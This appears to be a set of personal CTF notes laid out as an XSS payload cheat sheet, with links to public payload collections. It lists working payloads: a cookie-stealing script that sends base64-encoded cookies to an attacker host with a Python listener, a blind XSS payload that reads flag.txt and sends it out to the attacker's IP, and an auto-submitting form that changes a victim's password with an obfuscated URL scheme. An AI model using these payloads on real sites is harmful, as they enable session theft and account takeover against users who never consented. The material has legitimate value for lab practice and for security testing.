simple xss:
```bash
python3 -m http.server ATTACKER_SERVER_PORT
```

```javascript
<script>fetch('http://ATTACKER_IP:ATTACKER_SERVER_PORT/?'+btoa(document.cookie));</script>  
#result is base64 encoded
```

blind xss
```javascript
example:  
'"><script>  
fetch('http://127.0.0.1:8080/flag.txt')  
.then(response => response.text())  
.then(data => {  
fetch('http://<YOUR-IP-ADDRESS-tun0>:8000/?flag=' + encodeURIComponent(data));  
});  
</script>
```
simple DOM
```javascript
<script>  
window.onload = function() {  
var form = document.createElement('form');  
form.method = 'POST';  
form.action = 'ht'+'tP://' + 'login.worldwap.thm/change_password.php';  
var input = document.createElement('input');  
input.type = 'hidden';  
input.name = 'new_password';  
input.value = 'hello';  
form.appendChild(input);  
document.body.appendChild(form);  
form.submit();  
};  
</script>
```
useful resources:
https://ttp.parzival.sh/pentesting/web-applications/injection-vulnerabilities/cross-site-scripting/stealing-cookies
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
https://infosec-db.github.io/CyberDepot/payloads/web_exploits/xss/
https://www.almabetter.com/bytes/cheat-sheet/xss
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
https://findxss.com/
https://hackersonlineclub.com/cross-site-scripting-xss/